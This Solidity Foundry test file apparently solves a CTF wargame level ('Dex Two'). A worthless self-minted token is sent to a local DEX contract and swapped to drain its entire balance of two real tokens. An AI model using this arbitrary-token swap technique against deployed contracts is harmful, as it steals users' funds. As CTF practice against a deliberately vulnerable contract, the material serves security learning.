// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level23.sol";

contract Level23Test is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    SwappableTokenTwo public token3;
    address bob = vm.addr(1);
    address alice = vm.addr(2);
    address tk1;
    address tk2;
    address tk3;

    function setUp() public {
      // Add ether
      vm.deal(bob, 6 ether);

      //Initialize dex
      vm.startPrank(bob);
      dex = new DexTwo();
      token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
      token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);
      tk1 = address(token1);
      tk2 = address(token2);

      // Set tokens, approve and add liquidity
      dex.setTokens(tk1, tk2);
      dex.approve(address(dex), 100);
      dex.add_liquidity(tk1, 100 );
      dex.add_liquidity(tk2, 100 );

      //Fund test account
      token1.transfer(alice, 10 );
      token2.transfer(alice, 10 );


      console.log("Test account");
      console.log("TK1", token1.balanceOf(alice));
      console.log("TK2", token2.balanceOf(alice));
      console.log("Dex");
      console.log("TK1", token1.balanceOf(address(dex)));
      console.log("TK2", token2.balanceOf(address(dex)));
      vm.stopPrank();

    }

    function testLevel23() public {
      vm.startPrank(alice);

      dex.approve(address(dex), 100000);
      token3 = new SwappableTokenTwo(address(dex), "Token3", "TK3", 10000);
      tk3 = address(token3);

      //Send directly shit coins to Dex address, add_liquidity is ownerOnly
      token3.transfer(address(dex), 100);
      token3.approve(alice, address(dex), 10000);
      dex.swap(tk3, tk1, 100);
      dex.swap(tk3, tk2, 200);

      assert(token1.balanceOf(alice) == 110);
      assert(token2.balanceOf(alice) == 110);
      vm.stopPrank();
    }
}
